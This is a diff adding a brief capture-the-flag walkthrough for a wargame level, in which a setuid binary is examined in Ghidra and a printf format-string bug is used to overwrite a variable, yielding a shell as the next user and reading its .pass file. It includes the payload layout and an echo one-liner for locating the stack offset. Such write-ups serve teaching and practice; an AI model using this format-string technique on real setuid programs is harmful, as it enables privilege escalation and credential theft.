@@ -1,0 +1,32 @@
+level3 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level4 users 5403 Mar  6  2016 level3
+
+
+2.
+$ ./level3
+//waiting for input
+
+3. ghidra usage 
+
+find that can change a m value using printf in v function
+
+4. write a script to change the m value
+
+so I write a buff which contain  <m_address> + A * 60 + <position_of_m>
+
+and save it in /tmp/exploit3
+
+//(echo -e "\x8c\x98\x04\x08.%4\$x") | ./level3  can help find position of m
+
+6. 
+$ (cat /tmp/exploit3; cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+ls
+ls: cannot open directory .: Permission denied
+cd ../level4
+cat .pass
